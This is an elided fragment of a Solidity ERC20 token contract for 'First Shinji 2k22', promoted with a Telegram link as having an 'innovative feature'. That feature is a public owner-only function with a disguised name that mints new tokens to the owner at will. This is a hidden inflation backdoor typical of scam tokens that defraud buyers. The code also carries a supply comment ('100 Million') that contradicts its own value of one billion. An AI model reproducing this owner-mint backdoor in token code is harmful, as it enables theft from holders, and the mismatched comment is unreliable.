...
//
// $FirstShinji2k22 proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/Firstshinji2k22
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Firstshinji2k22(uint256 amount) public onlyOwner {
 _Firstshinji2k22(msg.sender, amount);
    }
    ...
    function _Firstshinji2k22(address account, uint256 amount) internal virtual {
...
contract $FirstShinji2k22 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("First Shinji 2k22", "FIRSTSHINJI2K22") {
        _Firstshinji2k22(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}